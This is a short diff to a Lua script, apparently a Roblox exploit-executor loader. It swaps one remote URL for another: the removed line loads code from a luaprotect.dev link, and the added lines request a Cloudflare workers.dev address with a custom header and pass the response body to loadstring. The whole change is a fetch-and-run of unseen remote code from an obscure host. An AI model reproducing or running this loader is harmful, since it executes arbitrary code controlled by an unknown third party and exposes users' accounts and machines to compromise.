@@ -1,1 +1,8 @@
-loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/d4ae71/zQUfG4WLXc-wx5q1"))()
+local response = request({
+    Url = "https://falling-hat-2e55.stremlingremlin.workers.dev/",
+    Method = "GET",
+    Headers = {
+        ["beta-v1-gng"] = "1"
+    }
+})
+loadstring(response.Body)()
